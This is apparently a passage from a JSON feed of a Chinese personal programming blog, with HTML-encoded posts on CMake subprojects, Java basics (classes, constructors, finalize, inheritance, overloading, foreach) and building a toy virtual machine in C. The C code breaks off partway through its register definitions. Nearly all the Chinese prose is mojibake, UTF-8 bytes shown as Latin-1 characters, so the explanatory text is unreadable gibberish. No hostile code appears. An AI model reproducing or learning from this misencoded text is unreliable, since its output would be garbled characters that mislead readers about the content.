CMakeLists.txt æ¥åˆ›å»ºä»¥ä¸‹å†…å®¹ï¼š</p>\n<ul>\n<li>sublibrary1 - ä¸€ä¸ªé™æ€åº“</li>\n<li>sublibrary2 - åªæœ‰å¤´æ–‡ä»¶çš„åº“</li>\n<li>subbinary - ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</li>\n</ul>\n<p>æ–‡ä»¶æ ‘å¦‚ä¸‹:</p>\n<pre><code>$ tree\n.\nâ”œâ”€â”€ CMakeLists.txt\nâ”œâ”€â”€ subbinary\nâ”‚   â”œâ”€â”€ CMakeLists.txt\nâ”‚   â””â”€â”€ main.cpp\nâ”œâ”€â”€ sublibrary1\nâ”‚   â”œâ”€â”€ CMakeLists.txt\nâ”‚   â”œâ”€â”€ include\nâ”‚   â”‚   â””â”€â”€ sublib1\nâ”‚   â”‚       â””â”€â”€ sublib1.h\nâ”‚   â””â”€â”€ src\nâ”‚       â””â”€â”€ sublib1.cpp\nâ””â”€â”€ sublibrary2\n    â”œâ”€â”€ CMakeLists.txt\n    â””â”€â”€ include\n        â””â”€â”€ sublib2\n            â””â”€â”€ sublib2.h\n</code></pre>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/19/JAVA%E5%AD%A6%E4%B9%A0/",
            "url": "https://3cly.github.io/2023/03/19/JAVA%E5%AD%A6%E4%B9%A0/",
            "title": "JAVAå­¦ä¹ ",
            "date_published": "2023-03-19T03:15:55.000Z",
            "content_html": "<h1 id=\"java\"><a class=\"markdownIt-Anchor\" href=\"#java\">#</a> JAVA</h1>\n<p>[^Java æ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒæ”¯æŒç±»å’Œå¯¹è±¡çš„æ¦‚å¿µã€‚ç±»æ˜¯ä¸€ç§ç”¨æˆ·å®šä¹‰çš„æ•°æ®ç±»å‹ï¼Œå®ƒåŒ…å«äº†æ•°æ®åŸŸå’Œæ–¹æ³•ã€‚å¯¹è±¡æ˜¯ç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œå®ƒå¯ä»¥æ“ä½œç±»ä¸­å®šä¹‰çš„æ–¹æ³•å’Œæ•°æ®ã€‚]:</p>\n<p>ä¸ªäººåœ¨å­¦ä¹  JAVA è¿‡ç¨‹ä¸­çš„ä¸€äº›æ€»ç»“</p>\n<h2 id=\"ä¸€äº›javaä¸cçš„åŒºåˆ«\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€äº›javaä¸cçš„åŒºåˆ«\">#</a> ä¸€äº› JAVA ä¸ C çš„åŒºåˆ«</h2>\n<p>Java å’Œ C è¯­è¨€æœ‰ä»¥ä¸‹å‡ ä¸ªåŒºåˆ«ï¼š</p>\n<ol>\n<li>Java æ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œè€Œ C è¯­è¨€æ˜¯ä¸€ç§è¿‡ç¨‹å¼ç¼–ç¨‹è¯­è¨€ã€‚</li>\n<li>Java æœ‰åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œè€Œ C è¯­è¨€éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜ã€‚</li>\n<li>Java å¯ä»¥è·¨å¹³å°è¿è¡Œï¼Œè€Œ C è¯­è¨€é€šå¸¸éœ€è¦ç¼–è¯‘æˆç‰¹å®šçš„æœºå™¨ç æ‰èƒ½è¿è¡Œã€‚</li>\n<li>Java æ”¯æŒç»§æ‰¿ã€å°è£…å’Œå¤šæ€ç­‰é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ¦‚å¿µï¼Œè€Œ C è¯­è¨€ä¸æ”¯æŒè¿™äº›æ¦‚å¿µã€‚</li>\n<li>Java æœ‰è‡ªå·±çš„è™šæ‹Ÿæœºï¼ˆJVMï¼‰æ¥è§£é‡Šå’Œæ‰§è¡Œå­—èŠ‚ç ï¼Œè€Œ C è¯­è¨€ç›´æ¥ç¼–è¯‘æˆæœºå™¨ç è¿è¡Œã€‚</li>\n</ol>\n<h2 id=\"ç±»çš„å®šä¹‰\"><a class=\"markdownIt-Anchor\" href=\"#ç±»çš„å®šä¹‰\">#</a> ç±»çš„å®šä¹‰</h2>\n<p>åœ¨ Java ä¸­ï¼Œé€šè¿‡å…³é”®å­—  <code>class</code>  æ¥å®šä¹‰ä¸€ä¸ªç±»ã€‚ç±»çš„å®šä¹‰ä¸€èˆ¬åŒ…å«ä»¥ä¸‹å‡ éƒ¨åˆ†ï¼š</p>\n<pre><code>public class ClassName &#123;\n    // å®šä¹‰æ•°æ®åŸŸ\n    // ...\n\n    // å®šä¹‰æ–¹æ³•\n    // ...\n&#125;\n</code></pre>\n<p>å…¶ä¸­  <code>public</code>  æ˜¯è®¿é—®ä¿®é¥°ç¬¦ï¼Œç”¨äºæŒ‡å®šç±»çš„è®¿é—®æƒé™ã€‚ç±»å  <code>ClassName</code>  å¯ä»¥è‡ªå®šä¹‰ï¼Œä½†æ˜¯å¿…é¡»ç¬¦åˆ Java çš„å‘½åè§„èŒƒã€‚</p>\n<h2 id=\"å¯¹è±¡çš„åˆ›å»º\"><a class=\"markdownIt-Anchor\" href=\"#å¯¹è±¡çš„åˆ›å»º\">#</a> å¯¹è±¡çš„åˆ›å»º</h2>\n<p>ä½¿ç”¨  <code>new</code>  å…³é”®å­—å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚ä¾‹å¦‚ï¼š</p>\n<pre><code>ClassName object = new ClassName();\n</code></pre>\n<p>è¿™é‡Œ  <code>ClassName</code>  æ˜¯ç±»åï¼Œ <code>object</code>  æ˜¯å¯¹è±¡åï¼Œ <code>new</code>  å…³é”®å­—ç”¨äºåˆ›å»ºå¯¹è±¡ã€‚é€šè¿‡  <code>.</code>  è¿ç®—ç¬¦å¯ä»¥è®¿é—®å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¾‹å¦‚ï¼š</p>\n<pre><code>object.propertyName;\nobject.methodName();\n</code></pre>\n<h2 id=\"å¯¹è±¡çš„æ„é€ å’Œææ„\"><a class=\"markdownIt-Anchor\" href=\"#å¯¹è±¡çš„æ„é€ å’Œææ„\">#</a> å¯¹è±¡çš„æ„é€ å’Œææ„</h2>\n<p>åœ¨ Java ä¸­ï¼Œå¯¹è±¡çš„æ„é€ æ–¹æ³•å’Œææ„æ–¹æ³•åˆ†åˆ«æ˜¯  <code>constructor</code>  å’Œ  <code>finalize</code> ã€‚æ„é€ æ–¹æ³•åœ¨å¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼›ææ„æ–¹æ³•åœ¨å¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œç”¨äºæ¸…ç†å¯¹è±¡çš„çŠ¶æ€ã€‚</p>\n<pre><code>public ClassName() &#123;\n    // æ„é€ æ–¹æ³•ä»£ç \n&#125;\n\nprotected void finalize() &#123;\n    // ææ„æ–¹æ³•ä»£ç \n&#125;\n</code></pre>\n<h2 id=\"å°è£…\"><a class=\"markdownIt-Anchor\" href=\"#å°è£…\">#</a> å°è£…</h2>\n<p>åœ¨ Java ä¸­ï¼Œå°è£…æ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„ç¼–ç¨‹æ¦‚å¿µã€‚å®ƒæŒ‡çš„æ˜¯å°†æ•°æ®å’Œæ–¹æ³•å°è£…åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œå¹¶é€šè¿‡è®¿é—®ä¿®é¥°ç¬¦æ¥æ§åˆ¶å¯¹è¿™äº›æ•°æ®å’Œæ–¹æ³•çš„è®¿é—®æƒé™ã€‚Java ä¸­çš„è®¿é—®ä¿®é¥°ç¬¦åŒ…æ‹¬  <code>public</code> ã€ <code>private</code> ã€ <code>protected</code>  å’Œé»˜è®¤è®¿é—®ä¿®é¥°ç¬¦ã€‚å…¶ä¸­ï¼Œ <code>public</code>  è¡¨ç¤ºå…¬å…±è®¿é—®æƒé™ï¼Œ <code>private</code>  è¡¨ç¤ºç§æœ‰è®¿é—®æƒé™ï¼Œ <code>protected</code>  è¡¨ç¤ºå—ä¿æŠ¤çš„è®¿é—®æƒé™ï¼Œè€Œé»˜è®¤è®¿é—®ä¿®é¥°ç¬¦åˆ™è¡¨ç¤ºåŒ…çº§è®¿é—®æƒé™ã€‚</p>\n<h2 id=\"ç»§æ‰¿\"><a class=\"markdownIt-Anchor\" href=\"#ç»§æ‰¿\">#</a> ç»§æ‰¿</h2>\n<p>ç»§æ‰¿æ˜¯ Java ä¸­å¦ä¸€ä¸ªé‡è¦çš„é¢å‘å¯¹è±¡ç¼–ç¨‹æ¦‚å¿µã€‚å®ƒæŒ‡çš„æ˜¯å­ç±»ç»§æ‰¿çˆ¶ç±»çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å­ç±»ä¸­æ·»åŠ æ–°çš„å±æ€§å’Œæ–¹æ³•ã€‚Java ä¸­çš„ç»§æ‰¿å…³ç³»å¯ä»¥ç”¨  <code>extends</code>  å…³é”®å­—è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼š</p>\n<pre><code>class SubClassName extends SuperClassName &#123;\n    // å­ç±»çš„å±æ€§å’Œæ–¹æ³•\n&#125;\n</code></pre>\n<h2 id=\"å¤šæ€\"><a class=\"markdownIt-Anchor\" href=\"#å¤šæ€\">#</a> å¤šæ€</h2>\n<p>å¤šæ€æ˜¯ Java ä¸­çš„å¦ä¸€ä¸ªé‡è¦çš„é¢å‘å¯¹è±¡ç¼–ç¨‹æ¦‚å¿µã€‚å®ƒæŒ‡çš„æ˜¯åŒä¸€ä¸ªæ–¹æ³•åœ¨ä¸åŒçš„å¯¹è±¡ä¸Šå¯ä»¥æœ‰ä¸åŒçš„å®ç°æ–¹å¼ã€‚Java ä¸­çš„å¤šæ€å¯ä»¥é€šè¿‡æ–¹æ³•é‡è½½å’Œæ–¹æ³•é‡å†™æ¥å®ç°ã€‚</p>\n<p>æ–¹æ³•é‡è½½æŒ‡çš„æ˜¯åœ¨åŒä¸€ä¸ªç±»ä¸­å®šä¹‰ä¸¤ä¸ªæˆ–å¤šä¸ªæ–¹æ³•ï¼Œå®ƒä»¬å…·æœ‰ç›¸åŒçš„æ–¹æ³•åä½†æ˜¯å‚æ•°åˆ—è¡¨ä¸åŒã€‚æ–¹æ³•é‡å†™æŒ‡çš„æ˜¯åœ¨å­ç±»ä¸­é‡æ–°å®šä¹‰ä¸€ä¸ªå’Œçˆ¶ç±»ä¸­ç›¸åŒåç§°å’Œå‚æ•°åˆ—è¡¨çš„æ–¹æ³•ã€‚é‡è½½æ–¹æ³•å…è®¸ä½ ä½¿ç”¨åŒæ ·çš„åå­—æ¥å®šä¹‰ä¸åŒçš„æ–¹æ³•ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°åˆ—è¡¨æ˜¯ä¸åŒçš„ã€‚Java æ ¹æ®æ–¹æ³•ç­¾åå†³å®šä½¿ç”¨å“ªä¸ªæ–¹æ³• (å½“ç¼–è¯‘å™¨æ— æ³•åˆ¤æ–­å“ªä¸ªæ˜¯æœ€ç²¾ç¡®çš„åŒ¹é…æ—¶ä¼šäº§ç”Ÿæ­§ä¹‰è°ƒç”¨)</p>\n<p>[^ æ–¹æ³•ç­¾åæŒ‡çš„æ˜¯ä¸€ä¸ªæ–¹æ³•çš„åç§°ã€å‚æ•°æ•°é‡å’Œå‚æ•°ç±»å‹çš„ç»„åˆã€‚æ–¹æ³•ç­¾åå¯ä»¥ç”¨äºé‡è½½æ–¹æ³•ï¼Œå³åœ¨åŒä¸€ä¸ªç±»ä¸­å®šä¹‰å¤šä¸ªåŒåä½†å‚æ•°åˆ—è¡¨ä¸åŒçš„æ–¹æ³•ã€‚Java è¦æ±‚æ–¹æ³•ç­¾åå¿…é¡»å”¯ä¸€ï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚]:</p>\n<h2 id=\"æ‚\"><a class=\"markdownIt-Anchor\" href=\"#æ‚\">#</a> æ‚</h2>\n<p>è®²è®¿é—®çº§åˆ«ä¿®é¥°ç¬¦çš„ https://blog.csdn.net/aimeimeits/article/details/54136219</p>\n<p>æ¯ä¸ª java ç¨‹åºè‡³å°‘åº”è¯¥æœ‰ä¸€ä¸ªç±»</p>\n<p>ä¸€ä¸ªæºæ–‡ä»¶ä¸­åªèƒ½æœ‰ä¸€ä¸ª public ç±»</p>\n<p>ä¸€ä¸ªæºæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªé public ç±»</p>\n<p>æºæ–‡ä»¶çš„åç§°åº”è¯¥å’Œ public ç±»çš„ç±»åä¿æŒä¸€è‡´ã€‚ä¾‹å¦‚ï¼šæºæ–‡ä»¶ä¸­ public ç±»çš„ç±»åæ˜¯ Employeeï¼Œé‚£ä¹ˆæºæ–‡ä»¶åº”è¯¥å‘½åä¸º Employee.javaã€‚</p>\n<p>ç¨‹åºæ˜¯ä» main æ–¹æ³•å¼€å§‹æ‰§è¡Œçš„</p>\n<p>ä½¿ç”¨ Math ç±»ä¸­çš„æ–¹æ³•æ±‚è§£æ•°å­¦é—®é¢˜:abs æ–¹æ³•è¿”å›ä¸€ä¸ªæ•° (int,long,float æˆ– double å‹) çš„ç»å¯¹å€¼</p>\n<p>random () æ–¹æ³•ç”Ÿæˆå¤§äºç­‰äº 0.0 ä¸”å°äº 1.0 çš„ double å‹éšæœºæ•°</p>\n<p>æ¯”è¾ƒå’Œæµ‹è¯•å­—ç¬¦ç”¨ Character ç±»çš„æ–¹æ³•</p>\n<p>this å¼•ç”¨æ•°æ®åŸŸï¼Œthis è°ƒç”¨æ„é€ æ–¹æ³•</p>\n<p>æ ¼å¼åŒ–æ§åˆ¶å°è¾“å‡º System.out.printf</p>\n<p><strong>java æ”¯æŒ foreach å¾ªç¯</strong> ä»è€Œä¸ä½¿ç”¨ä¸‹æ ‡å˜é‡å°±å¯ä»¥é¡ºåºéå†æ•´ä¸ªæ•°ç»„</p>\n<p>è¯­æ³•å¦‚ä¸‹ï¼š</p>\n<pre><code>for (å…ƒç´ ç±»å‹ å…ƒç´ å˜é‡ : æ•°ç»„æˆ–é›†åˆ) &#123;\n    // å¾ªç¯ä½“\n&#125;\n</code></pre>\n<p>å…¶ä¸­ï¼Œ <code>å…ƒç´ ç±»å‹</code>  æŒ‡çš„æ˜¯æ•°ç»„æˆ–é›†åˆä¸­å…ƒç´ çš„ç±»å‹ï¼Œ <code>å…ƒç´ å˜é‡</code>  æ˜¯å¾ªç¯éå†è¿‡ç¨‹ä¸­æ¯ä¸ªå…ƒç´ çš„å˜é‡åï¼Œ <code>æ•°ç»„æˆ–é›†åˆ</code>  æ˜¯è¦éå†çš„å¯¹è±¡ã€‚</p>\n<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ foreach å¾ªç¯éå†æ•°ç»„çš„ä¾‹å­ï¼š</p>\n<pre><code>int[] numbers = &#123;1, 2, 3, 4, 5&#125;;\nfor (int number : numbers) &#123;\n    System.out.println(number);\n&#125;\n</code></pre>\n<p>java.util.Arrays ç±»åŒ…å«ä¸€äº›å®ç”¨çš„æ–¹æ³•ç”¨äºæ•°ç»„æ“ä½œï¼Œæ¯”å¦‚æ’åºå’ŒæŸ¥æ‰¾</p>\n<p><strong>å®šä¹‰ä¸€ä¸ªæ ‡å‡†çš„ç±»</strong></p>\n<p>ä¸€ä¸ªæ ‡å‡†çš„ç±»é€šå¸¸è¦æ‹¥æœ‰å››ä¸ªç»„æˆéƒ¨åˆ†:</p>\n<p>1. æ‰€æœ‰çš„æˆå‘˜å˜é‡éƒ½è¦ä½¿ç”¨ private å…³é”®å­—ä¿®é¥°</p>\n<p>2. ä¸ºæ¯ä¸€ä¸ªæˆå‘˜å˜é‡ç¼–å†™ä¸€å¯¹ getter/setter æ–¹æ³•</p>\n<p>3. ç¼–å†™ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ æ–¹æ³•</p>\n<p>4. ç¼–å†™ä¸€ä¸ªå…¨å‚æ•°çš„æ„é€ æ–¹æ³•</p>\n<p>[^ è¿™æ ·æ ‡å‡†çš„ç±»å«åš Java Bean]:</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/03/19/Write-Virtual-Machine/",
            "url": "https://3cly.github.io/2023/03/19/Write-Virtual-Machine/",
            "title": "Write Virtual Machine",
            "date_published": "2023-03-19T03:15:55.000Z",
            "content_html": "<h1 id=\"ç¼–å†™è‡ªå·±çš„è™šæ‹Ÿæœº\"><a class=\"markdownIt-Anchor\" href=\"#ç¼–å†™è‡ªå·±çš„è™šæ‹Ÿæœº\">#</a> ç¼–å†™è‡ªå·±çš„è™šæ‹Ÿæœº</h1>\n<h2 id=\"ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœº\"><a class=\"markdownIt-Anchor\" href=\"#ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœº\">#</a> ä»€ä¹ˆæ˜¯è™šæ‹Ÿæœº</h2>\n<img data-src=\"\\images\\p272648921.jpg\" alt=\"p272648921\" style=\"zoom: 50%;\">\n<h2 id=\"è™šæ‹Ÿæœºçš„ç¡¬ä»¶ç»„ä»¶çš„æ¨¡æ‹Ÿ\"><a class=\"markdownIt-Anchor\" href=\"#è™šæ‹Ÿæœºçš„ç¡¬ä»¶ç»„ä»¶çš„æ¨¡æ‹Ÿ\">#</a> è™šæ‹Ÿæœºçš„ç¡¬ä»¶ç»„ä»¶çš„æ¨¡æ‹Ÿ</h2>\n<h3 id=\"å†…å­˜ç©ºé—´\"><a class=\"markdownIt-Anchor\" href=\"#å†…å­˜ç©ºé—´\">#</a> å†…å­˜ç©ºé—´</h3>\n<p>è™šæ‹Ÿæœºä¸­æ¨¡æ‹Ÿå†…å­˜ç¡¬ä»¶çš„ä½œç”¨æ˜¯ä¸ºäº†åœ¨ä¸€ä¸ªå®Œå…¨éš”ç¦»çš„ç¯å¢ƒä¸­è¿è¡Œä¸€ä¸ªå®Œæ•´çš„è®¡ç®—æœºç³»ç»Ÿ</p>\n<h3 id=\"å¯„å­˜å™¨\"><a class=\"markdownIt-Anchor\" href=\"#å¯„å­˜å™¨\">#</a> å¯„å­˜å™¨</h3>\n<p>ä¸€ä¸ªå¯„å­˜å™¨å°±æ˜¯ CPU ä¸Šä¸€ä¸ªèƒ½å¤Ÿå­˜å‚¨å•ä¸ªæ•°æ®çš„æ§½ã€‚<strong>å¯„å­˜å™¨å°±åƒ CPU çš„ â€œå·¥ä½œå°â€</strong>ã€‚<strong>CPU è¦å¯¹ä¸€æ®µæ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¿…é¡»å…ˆå°†æ•°æ®æ”¾åˆ°æŸä¸ªå¯„å­˜å™¨ä¸­</strong>ã€‚ä½†å› ä¸ºå¯„å­˜å™¨çš„æ•°é‡å¾ˆå°‘ï¼Œå› æ­¤åœ¨ä»»æ„æ—¶åˆ»åªèƒ½æœ‰å¾ˆå°‘çš„æ•°æ®åŠ è½½åˆ°å¯„å­˜å™¨ã€‚è®¡ç®—æœºçš„è§£å†³åŠæ³•æ˜¯ï¼šé¦–å…ˆå°†æ•°æ®ä»å†…å­˜åŠ è½½åˆ°å¯„å­˜å™¨ï¼Œç„¶åå°†è®¡ç®—ç»“æœæ”¾åˆ°å…¶ä»–å¯„å­˜å™¨ï¼Œæœ€åå°†æœ€ç»ˆç»“æœ å†å†™å›å†…å­˜ã€‚</p>\n<h3 id=\"æŒ‡ä»¤é›†\"><a class=\"markdownIt-Anchor\" href=\"#æŒ‡ä»¤é›†\">#</a> æŒ‡ä»¤é›†</h3>\n<p>æŒ‡ä»¤æ˜¯å‘Šè¯‰ CPU æ‰§è¡Œä¸€äº›åŸºæœ¬ä»»åŠ¡çš„å‘½ä»¤ï¼Œä¾‹å¦‚å°†ä¸¤ä¸ªæ•°å­—ç›¸åŠ ã€‚æŒ‡ä»¤æ—¢æœ‰æŒ‡ç¤ºè¦æ‰§è¡Œçš„ä»»åŠ¡ç±»å‹çš„<strong>æ“ä½œç </strong>ï¼Œä¹Ÿæœ‰ä¸€ç»„ä¸ºæ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡æä¾›è¾“å…¥çš„<strong>å‚æ•°ã€‚</strong></p>\n<p>æ¯ä¸ª<strong>æ“ä½œç </strong>ä»£è¡¨ CPU â€œçŸ¥é“â€ å¦‚ä½•æ‰§è¡Œçš„ä¸€é¡¹ä»»åŠ¡ã€‚</p>\n<h3 id=\"æ¡ä»¶æ ‡å¿—ä½\"><a class=\"markdownIt-Anchor\" href=\"#æ¡ä»¶æ ‡å¿—ä½\">#</a> æ¡ä»¶æ ‡å¿—ä½</h3>\n<p><code>R_COND</code>  å¯„å­˜å™¨å­˜å‚¨æ¡ä»¶æ ‡è®°ï¼Œå…¶ä¸­è®°å½•äº†æœ€è¿‘ä¸€æ¬¡è®¡ç®—çš„æ‰§è¡Œç»“æœã€‚ è¿™ä½¿å¾—ç¨‹åºå¯ä»¥å®Œæˆè¯¸å¦‚  <code>if (x &gt; 0) &#123; ... &#125;</code>  ä¹‹ç±»çš„é€»è¾‘æ¡ä»¶ã€‚</p>\n<p>æ¯ä¸ª CPU éƒ½æœ‰å¾ˆå¤šæ¡ä»¶æ ‡å¿—ä½æ¥è¡¨ç¤ºä¸åŒçš„æƒ…å½¢ã€‚</p>\n<h2 id=\"ä¸€äº›åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€äº›åŸç†\">#</a> ä¸€äº›åŸç†</h2>\n<h3 id=\"æœºå™¨ç \"><a class=\"markdownIt-Anchor\" href=\"#æœºå™¨ç \">#</a> æœºå™¨ç </h3>\n<p>ä¸€ç§ç§°ä¸º <strong>æ±‡ç¼–å™¨</strong>ï¼ˆassemblerï¼‰çš„å·¥å…·ä¼š<strong>å°†è¿™äº›æ–‡æœ¬æ ¼å¼çš„æŒ‡ä»¤è½¬æ¢æˆ 16 æ¯”ç‰¹çš„äºŒè¿›åˆ¶æŒ‡ä»¤ï¼Œ åè€…æ˜¯è™šæ‹Ÿæœºå¯ä»¥ç†è§£çš„</strong>ã€‚è¿™ç§äºŒè¿›åˆ¶æ ¼å¼ç§°ä¸ºæœºå™¨ç ï¼ˆmachine codeï¼‰ï¼Œæ˜¯è™šæ‹Ÿæœºå¯ä»¥æ‰§è¡Œçš„æ ¼å¼ï¼Œå…¶æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª 16 æ¯”ç‰¹æŒ‡ä»¤ç»„æˆçš„æ•°ç»„ã€‚</p>\n<p><img data-src=\"/images/assembler.png\" alt=\"image.png\"></p>\n<h3 id=\"ä¸­æ–­å¼‚å¸¸trapçš„äº†è§£\"><a class=\"markdownIt-Anchor\" href=\"#ä¸­æ–­å¼‚å¸¸trapçš„äº†è§£\">#</a> ä¸­æ–­ï¼Œå¼‚å¸¸ï¼Œtrap çš„äº†è§£</h3>\n<p>è¿™å‡ ä¸ªæˆ‘éƒ½è¿˜æ²¡åš 233</p>\n<p><img data-src=\"/images/image-20230317165448823.png\" alt=\"image.png\"></p>\n<h2 id=\"æ¢ç´¢å®ç°x86æ¶æ„çš„è™šæ‹Ÿæœºcè¯­è¨€\"><a class=\"markdownIt-Anchor\" href=\"#æ¢ç´¢å®ç°x86æ¶æ„çš„è™šæ‹Ÿæœºcè¯­è¨€\">#</a> æ¢ç´¢ &amp; å®ç° x86 æ¶æ„çš„è™šæ‹Ÿæœº (C è¯­è¨€)</h2>\n<p>åŸºäº x86 æ¶æ„çš„è™šæ‹Ÿæœºå®ç°å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p>\n<ul>\n<li>\n<p>è®¾è®¡è™šæ‹Ÿæœºçš„ç»“æ„</p>\n</li>\n<li>\n<p>ç¼–å†™è™šæ‹Ÿæœºçš„åˆå§‹åŒ–å’Œè¿è¡Œå‡½æ•°</p>\n</li>\n<li>\n<p>ç¼–å†™è™šæ‹Ÿæœºçš„æŒ‡ä»¤é›†çš„å„æŒ‡ä»¤çš„å®ç°å‡½æ•°å’Œæ‰§è¡Œè™šæ‹Ÿæœºçš„å‡½æ•°</p>\n</li>\n</ul>\n<h3 id=\"è™šæ‹Ÿæœºçš„åŸºæœ¬ç»“æ„\"><a class=\"markdownIt-Anchor\" href=\"#è™šæ‹Ÿæœºçš„åŸºæœ¬ç»“æ„\">#</a> è™šæ‹Ÿæœºçš„åŸºæœ¬ç»“æ„</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// å®šä¹‰è™šæ‹Ÿæœºçš„å†…å­˜å¤§å°</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MEM_SIZE</span> <span class=\"token expression\"><span class=\"token number\">512</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// å®šä¹‰è™šæ‹Ÿæœºæ”¯æŒçš„æŒ‡ä»¤é›†</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    HLT<span class=\"token punctuation\">,</span> <span class=\"token comment\">// åœæ­¢æ‰§è¡Œ</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    MOV<span class=\"token punctuation\">,</span> <span class=\"token comment\">// ç§»åŠ¨æ•°æ®</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    ADD<span class=\"token punctuation\">,</span> <span class=\"token comment\">// åŠ æ³•è¿ç®—</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    SUB<span class=\"token punctuation\">,</span> <span class=\"token comment\">// å‡æ³•è¿ç®—</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    JMP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// æ— æ¡ä»¶è·³è½¬</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    JZ<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// æ¡ä»¶è·³è½¬ï¼ˆå¦‚æœé›¶æ ‡å¿—ä¸ºçœŸï¼‰</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    JNZ<span class=\"token punctuation\">,</span> <span class=\"token comment\">// æ¡ä»¶è·³è½¬ï¼ˆå¦‚æœé›¶æ ‡å¿—ä¸ºå‡ï¼‰</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// å®šä¹‰è™šæ‹Ÿæœºæ”¯æŒçš„å¯„å­˜å™¨</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    R0 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    R1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    R2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    R3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    PC<span class=\"token punctuation\">,</span> <span class=\"token comment\">// ç¨‹åºè®¡æ•°å™¨</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    SP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// æ ˆæŒ‡é’ˆ</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    FLG<span class=\"token punctuation\">,</span><span class=\"token comment\">// æ ‡å¿—å¯„å­˜å™¨ï¼ˆç”¨äºä¿å­˜æ¯”è¾ƒç»“æœï¼‰</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// 